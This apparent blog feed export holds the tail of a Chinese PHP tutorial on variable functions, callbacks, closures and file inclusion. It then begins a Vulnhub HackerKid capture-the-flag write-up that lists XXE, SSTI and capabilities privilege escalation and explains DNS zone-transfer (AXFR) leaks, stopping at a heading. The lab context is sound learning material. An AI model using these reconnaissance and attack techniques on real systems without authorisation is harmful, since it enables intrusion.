<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">    print_r(func_get_args());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo(<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到，定义函数的时候，没有设置参数列表，但结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117151631.png" /></p>
<p>这就是 <code>func_get_args</code>
的作用，获得传入函数的参数列表（生成一个索引数组）。有一个函数与这个很类似，<code>func_get_arg()</code>，可以获取参数列表中的某一个参数，利用索引获取。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">    print_r(func_get_args());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> func_get_arg(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo(<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117151804.png" /></p>
<pre><code>其实 array() 也是一个可变参数的函数</code></pre>
<h1 id="可变函数与回调函数">3. 可变函数与回调函数</h1>
<h2 id="可变函数">3.1. 可变函数</h2>
<p>可变函数定义：</p>
<ul>
<li>可变函数也叫作变量函数，即函数的名称来自另一个变量。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i + $j = &#x27;</span>.(<span class="variable">$i</span> + <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i - $j = &#x27;</span>.(<span class="variable">$i</span> - <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multi</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i * $j = &#x27;</span>.(<span class="variable">$i</span> * <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">div</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i / $j = &#x27;</span>.(<span class="variable">$i</span> / <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;可变函数的用法：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$funcName</span> = <span class="string">&#x27;add&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$funcName</span>(<span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$funcName</span> = <span class="string">&#x27;sub&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$funcName</span>(<span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$funcName</span> = <span class="string">&#x27;multi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$funcName</span>(<span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$funcName</span> = <span class="string">&#x27;div&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$funcName</span>(<span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117152355.png" /></p>
<p>根据结果可以看到，当变量 <code>$funcName</code>
发生变化时，调用的函数也发生变化，这里 <code>$funcName</code>
就是调用函数的名称，这就是可变函数的用法。</p>
<p>除了上面的用法，还可以使用 <code>call_user_func_array()</code>
来调用可变函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i + $j = &#x27;</span>.(<span class="variable">$i</span> + <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i - $j = &#x27;</span>.(<span class="variable">$i</span> - <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multi</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i * $j = &#x27;</span>.(<span class="variable">$i</span> * <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">div</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i / $j = &#x27;</span>.(<span class="variable">$i</span> / <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;用 call_user_func_array(可变函数名称, 参数列表数组) 调用可变函数：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$funcName</span> = <span class="string">&#x27;add&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> call_user_func_array(<span class="variable">$funcName</span>, [<span class="number">15</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$funcName</span> = <span class="string">&#x27;sub&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> call_user_func_array(<span class="variable">$funcName</span>, [<span class="number">15</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$funcName</span> = <span class="string">&#x27;multi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> call_user_func_array(<span class="variable">$funcName</span>, [<span class="number">15</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$funcName</span> = <span class="string">&#x27;div&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> call_user_func_array(<span class="variable">$funcName</span>, [<span class="number">15</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117153028.png" /></p>
<h2 id="回调函数">3.2. 回调函数</h2>
<p>回调函数：将可变函数的名称和可变函数的参数作为参数传入，在回调函数内部调用一个可变函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i + $j = &#x27;</span>.(<span class="variable">$i</span> + <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i - $j = &#x27;</span>.(<span class="variable">$i</span> - <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multi</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i * $j = &#x27;</span>.(<span class="variable">$i</span> * <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">div</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i / $j = &#x27;</span>.(<span class="variable">$i</span> / <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"><span class="variable">$funcName</span>, <span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$funcName</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;回调函数：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> demo(<span class="string">&#x27;add&#x27;</span>, <span class="number">30</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> demo(<span class="string">&#x27;sub&#x27;</span>, <span class="number">30</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> demo(<span class="string">&#x27;multi&#x27;</span>, <span class="number">30</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> demo(<span class="string">&#x27;div&#x27;</span>, <span class="number">30</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117153343.png" /></p>
<p>这里的 <code>demo</code> 就是回调函数。也可以使用
<code>call_user_func_array()</code> 来调用可变函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i + $j = &#x27;</span>.(<span class="variable">$i</span> + <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i - $j = &#x27;</span>.(<span class="variable">$i</span> - <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multi</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i * $j = &#x27;</span>.(<span class="variable">$i</span> * <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">div</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i / $j = &#x27;</span>.(<span class="variable">$i</span> / <span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"><span class="variable">$funcName</span>, <span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// return $funcName($a, $b);</span></span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="variable">$funcName</span>, [<span class="variable">$a</span>, <span class="variable">$b</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;回调函数：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> demo(<span class="string">&#x27;add&#x27;</span>, <span class="number">30</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> demo(<span class="string">&#x27;sub&#x27;</span>, <span class="number">30</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> demo(<span class="string">&#x27;multi&#x27;</span>, <span class="number">30</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> demo(<span class="string">&#x27;div&#x27;</span>, <span class="number">30</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>结果不变。</p>
<h2 id="用回调方式调用对象或类的方法">3.3.
用回调方式调用对象或类的方法</h2>
<blockquote>
<p>没搞懂，后续学到对象再回来</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;name = &#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;, age = &#x27;</span>.<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">func2</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;name = &#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;, age = &#x27;</span>.<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> call_user_func_array([<span class="string">&#x27;demo&#x27;</span>, <span class="string">&#x27;func1&#x27;</span>], [<span class="string">&#x27;takagi&#x27;</span>, <span class="string">&#x27;18&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> call_user_func_array([(<span class="keyword">new</span> demo), <span class="string">&#x27;func2&#x27;</span>], [<span class="string">&#x27;m1ku&#x27;</span>, <span class="string">&#x27;20&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117154158.png" /></p>
<h1 id="函数导入与文件包含">4. 函数导入与文件包含</h1>
<p>涉及到两个 PHP 语句：</p>
<ol type="1">
<li><code>require</code>
：用在文件开头，引入的文件的内容会直接替换该语句；</li>
<li><code>include</code> ：适合用于运行过程中，动态的引入外部文件；</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function showMess1()&#123;</span><br><span class="line">    return &#x27;welcome.&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function showMess2()&#123;</span><br><span class="line">    return &#x27;takagi&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &#x27;temp1.php&#x27;;</span><br><span class="line"></span><br><span class="line">echo showMess1();</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (true)&#123;</span><br><span class="line">    include &#x27;temp2.php&#x27;;</span><br><span class="line">    echo showMess2();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;no include&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还有两个函数与这两个函数对应：</p>
<ol type="1">
<li><code>require_once</code></li>
<li><code>include_once</code></li>
</ol>
<p>效果是一致的，这是用来确保文件只被引入一次（引入多次其实没啥用）。</p>
<blockquote>
<p><code>require</code> 和 <code>include</code>
不是函数，而是语言结构，同 <code>echo</code>
一样，后面的参数是文件名，可以放在括号内，也可以用字符串形式直接给出。</p>
</blockquote>
<h1 id="匿名函数与闭包实现">5. 匿名函数与闭包实现</h1>
<h2 id="匿名函数">5.1. 匿名函数</h2>
<p>匿名函数定义：</p>
<ul>
<li>没有名称或名称可以动态设置的函数；（其实匿名函数更像是用一个变量来表示函数）</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$showMess</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$showMess</span>(<span class="string">&#x27;takagi&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117155959.png" /></p>
<p>这里的 <code>$showMess</code> 就是匿名函数，需要注意：</p>
<ol type="1">
<li>创建的时候需要在花括号后面加上分号，理解为此时的函数就是一个变量；</li>
<li>调用的时候就是调用变量和函数的结合，既要 <code>$</code>
，也要传入参数；</li>
</ol>
<h2 id="闭包实现">5.2. 闭包实现</h2>
<p>闭包：</p>
<ul>
<li>就是在一个函数内，引入一个匿名函数；</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;My name is &#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$show</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> display(<span class="string">&#x27;m1ku&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117160146.png" /></p>
<p>这里的 <code>display</code> 就是闭包。</p>
<p>思考一个问题，此时的匿名函数在函数内部，那是否能够直接使用闭包函数的变量呢？答案是不能直接使用，需要用特殊的方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$wel</span> = <span class="string">&#x27;Welcome, &#x27;</span>;</span><br><span class="line">    <span class="variable">$show</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$wel</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$wel</span>.<span class="string">&#x27;My name is &#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$show</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> display(<span class="string">&#x27;m1ku&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117160318.png" /></p>
<h1 id="函数创建与调用">6. 函数创建与调用</h1>
<p>大概可以总结为 4 种：</p>
<ol type="1">
<li>用 <code>function</code>
创建最普通的函数，调用方式也是最普通的；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>.<span class="string">&#x27; + &#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27; = &#x27;</span>.(<span class="variable">$a</span> + <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> add(<span class="number">4</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117161330.png" /></p>
<ol start="2" type="1">
<li>用内置 <code>create_function</code> 创建函数，调用方式同匿名函数(PHP
8.0.0起被移除)；</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117161424.png" /></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$func1</span> = create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return $a.\&#x27; + \&#x27;.$b.\&#x27; = \&#x27;.($a + $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$func1</span>(<span class="number">7</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<ol start="3" type="1">
<li>用 <code>function</code> 创建匿名函数</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func2</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>.<span class="string">&#x27; + &#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27; = &#x27;</span>.(<span class="variable">$a</span> + <span class="variable">$b</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$func2</span>(<span class="number">3</span>, <span class="number">10</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117161554.png" /></p>
<ol start="4" type="1">
<li>用 <code>function</code>
创建匿名函数：没有名称，创建完直接执行，执行结束直接销毁；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;<span class="keyword">return</span> <span class="variable">$a</span>.<span class="string">&#x27; + &#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27; = &#x27;</span>.(<span class="variable">$a</span> + <span class="variable">$b</span>);&#125;)(<span class="number">20</span>, <span class="number">40</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117161723.png" /></p>
<p>函数创建完毕之后，直接在后面跟上参数。</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php基础</tag>
      </tags>
  </entry>
  <entry>
    <title>7 Vulnhub HackerKid1.0.1 Writeup</title>
    <url>/2022/04/08/7%20Vulnhub%20HackerKid1.0.1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度介于简单和中等之间，具有OSCP风格，不建议爆破，每一步都会有适当的提示。渗透所用到的攻击方式比较新（较前几个靶机来说）。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a
href="https://www.vulnhub.com/entry/hacker-kid-101,719/">hacker_kid</a></p>
<p>难度：Easy/Medium (Intermediate)。OSCP风格的中级难度靶机</p>
<p>目标：取得root权限（关注信息收集，不需要蛮力破解，每一步都有适当的提示）</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li><strong>DNS域传送</strong></li>
<li>XXE注入攻击</li>
<li>SSTI模板注入</li>
<li><strong>Capabilities提权</strong></li>
</ul>
<h1 id="dns域传送">DNS域传送</h1>
<h2 id="dns域简介">DNS域简介</h2>
<p>DNS (Domain Name
System)的作用是将域名转为对应的IP。<strong>DNS域是DNS服务器提供服务的域名空间的一部分</strong>。例如，<code>cloudflare.com</code>及其所有子域（<code>*.cloudflare.com</code>）可能是一个DNS域，当然<code>blog.example.com</code>也可能是一个单独的DNS域。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407230721.png" /></p>
<p><strong>同一个服务器上可以有多个web应用</strong>，一般有以下三种情况：</p>
<ol type="1">
<li>给这台服务器分配多个IP地址，每个web应用的域名对应的IP地址都不一样，这样子就可以通过不同的域名或者IP地址访问不同的web应用；</li>
<li>这台服务器只有一个IP地址，但是开放多个端口，可以把不同的web应用绑定在不同的端口上，这样子就能够通过不同的域名访问对应的web应用；</li>
<li>这台服务器只有一个IP地址，也只开放了一个端口，这时候就需要利用<strong>虚拟主机技术</strong>，就是通过不同的域名去访问这台服务器，服务器会根据域名响应对应的web应用；（比如：<code>/etc/hosts</code>中将不同的域名对应同一个IP）</li>
</ol>
<h2 id="为什么需要dns域传送">为什么需要DNS域传送</h2>
<p>DNS是非常重要的一个服务，如果DNS域的DNS服务器不工作，或者保存的信息过期了，那么这个域内的所有域名都无法被解析，因而对应的服务也就无法被访问。因此，每个域至少应该有两个DNS服务器，对于更关键的区域，可能存在着更多的DNS服务器。</p>
<p>有的DNS域非常的大，并且域内的信息可能经常改变。此时，如果管理员在该域内的每台DNS服务器上手动的修改信息的话，这不仅耗费大量的时间，而且也容易出错。因此，这时候就需要DNS域传送机制。</p>
<p>DNS域传送的作用：管理员只需要在主DNS服务器上进行修改，然后其他DNS服务器可以通过某种协议来请求主DNS服务器上的全部信息。其中最简单的协议就是<code>AXFR</code>。</p>
<h2 id="dns域传送漏洞">DNS域传送漏洞</h2>
<p>其实主要的是<code>AXFR</code>协议存在漏洞，该协议允许域内所有客户端请求DNS服务器上的信息。只需要获得一台域内的主机，就可以通过该漏洞获得该DNS域内所有子域名。本质上就是一种<strong>信息泄露漏洞</strong>。</p>
<h2 id="dns域名解析">DNS域名解析</h2>
<p>DNS服务同时占用TCP和UDP的53端口。DNS在进行域传送的时候使用TCP协议，其它时候则使用UDP协议。</p>
<p>所以，如果一台主机开启了<code>53/TCP</code>，那么该主机也极大可能开启<code>53/UDP</code>，并且该主机基本可以认定为是一台DNS服务器。但是反过来，如果某台主机开启了<code>53/UDP</code>，那么该主机不一定开启了<code>53/TCP</code>，因此，该主机是DNS服务器的可能性也不大。</p>
<h1 id="capabilities技术">Capabilities技术</h1>
